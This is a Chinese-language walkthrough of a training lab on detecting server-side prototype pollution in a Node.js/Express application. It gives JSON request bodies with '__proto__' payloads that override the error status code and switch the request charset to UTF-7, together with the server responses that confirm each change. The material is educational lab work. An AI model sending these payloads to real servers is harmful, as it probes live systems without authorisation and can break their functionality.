# 实验室：无污染属性反射检测服务端原型污染

本实验室基于 Node.js 和 Express 框架构建，由于不安全地将用户可控输入合并到服务端 JavaScript 对象中，存在服务端原型污染漏洞。

要解决本实验，请以触发服务器行为发生明显但非破坏性变化的方式污染 `Object.prototype`，从而确认漏洞。由于本实验旨在帮助你练习非破坏性检测技术，因此无需进一步进行漏洞利用。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **注意**
> 在测试服务端原型污染时，可能会破坏应用程序功能甚至导致服务器完全崩溃。如果实验室发生这种情况，你可以使用实验室横幅中提供的按钮手动重启服务器。请记住，在测试真实网站时，你不太可能有此选项，因此务必谨慎操作。

探测属性
- 尝试添加属性
    ```json
    {
        "address_line_1":"Wiener HQ",
        "address_line_2":"One Wiener Way",
        "city":"Wienerville",
        "postcode":"BU1 1RP",
        "country":"UK",
        "sessionId":"Ui6XRwJQIEKei01vVsfvgGggajxdiSgm",
        "foo":"bar"
    }
    ```
    - 响应
        ```json
        "foo":"bar",
        "isAdmin":false
        ```
        - 存在属性反射

- 尝试原型污染
    ```json
    {
        "address_line_1":"Wiener HQ",
        "address_line_2":"One Wiener Way",
        "city":"Wienerville",
        "postcode":"BU1 1RP",
        "country":"UK",
        "sessionId":"Ui6XRwJQIEKei01vVsfvgGggajxdiSgm",
        "__proto__":{
            "p_foo":"p_bar"
        }
    }
    ```
    - 响应
        - 不存在原型污染新属性的反射

尝试探测原型污染
- 方法1：污染错误码
    - 发送污染数据
        ```json
        {
            "address_line_1":"Wiener HQ",
            "address_line_2":"One Wiener Way",
            "city":"Wienerville",
            "postcode":"BU1 1RP",
            "country":"UK",
            "sessionId":"Ui6XRwJQIEKei01vVsfvgGggajxdiSgm",
            "__proto__":{
                "status":456
            }
        }
        ```
    - 发送触发错误的 JSON 格式错误，末尾的额外 `,`
        ```json
        {
            "address_line_1":"+AGYAbwBv-",
            "address_line_2":"One Wiener Way",
            "city":"Wienerville",
            "postcode":"BU1 1RP",
            "country":"UK",
            "sessionId":"Ui6XRwJQIEKei01vVsfvgGggajxdiSgm",
        }
        ```

    - 响应
        ```json
        {
            "error": {
                "expose": true,
                "statusCode": 456,
                "status": 456,
                "body": "    {\r\n        \"address_line_1\":\"+AGYAbwBv-\",\r\n        \"address_line_2\":\"One Wiener Way\",\r\n        \"city\":\"Wienerville\",\r\n        \"postcode\":\"BU1 1RP\",\r\n        \"country\":\"UK\",\r\n        \"sessionId\":\"Ui6XRwJQIEKei01vVsfvgGggajxdiSgm\",\r\n    }",
                "type": "entity.parse.failed",
                "p_foo": "p_bar"
            }
        }
        ```
        - 错误码成功被覆盖为之前污染的 `456`，然而遗漏了默认错误码
        - 之前未反射的测试原型污染新属性 `"p_foo": "p_bar"` 在此被反射

- 方法2：污染字符集 
    - 发送包含 UTF-7 编码字符串 `foo` 的普通数据
        ```json
        {
            "address_line_1":"+AGYAbwBv-",
            "address_line_2":"One Wiener Way",
            "city":"Wienerville",
            "postcode":"BU1 1RP",
            "country":"UK",
            "sessionId":"Ui6XRwJQIEKei01vVsfvgGggajxdiSgm"
        }
        ```
        - 响应
            ```json
            "address_line_1":"+AGYAbwBv-",
            ```
            - UTF-7 字符串未被解码
        
    - 发送字符集污染
        ```json
        {
            "address_line_1":"+AGYAbwBv-",
            "address_line_2":"One Wiener Way",
            "city":"Wienerville",
            "postcode":"BU1 1RP",
            "country":"UK",
            "sessionId":"Ui6XRwJQIEKei01vVsfvgGggajxdiSgm",
            "__proto__":{
                "content-type": "application/json; charset=utf-7"
            }
        }
        ```
    - 发送与第一次普通数据相同的内容
        - 响应
            ```json
            "address_line_1":"foo",
            ```
        - 成功解码 UTF-7 字符串
